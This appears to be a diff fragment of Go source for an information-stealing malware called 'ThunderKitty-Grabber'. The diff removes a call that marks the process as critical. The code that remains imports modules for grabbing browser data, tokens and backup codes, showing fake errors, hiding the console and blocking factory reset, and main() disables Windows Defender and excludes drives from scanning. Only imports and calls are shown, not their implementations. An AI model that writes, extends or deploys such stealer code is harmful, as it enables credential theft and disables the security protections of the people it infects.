@@ -25,7 +25,6 @@ import (
 	"ThunderKitty-Grabber/utils/fakeerror"
 	"ThunderKitty-Grabber/utils/browsers"
 	"ThunderKitty-Grabber/utils/tokengrabber"
-	"ThunderKitty-Grabber/utils/criticalprocess"
 	"ThunderKitty-Grabber/utils/hideconsole"
 	"ThunderKitty-Grabber/utils/backupcodes"
 	"ThunderKitty-Grabber/utils/disablefactoryreset"
@@ -64,7 +63,6 @@ func main() {
 	go Exclude.ExcludeDrive()
 	go Defender.Disable()
 	go Mutex.Create()
-	go CriticalProcess.Set()
 
 	go SysInfo.Fetch()
 
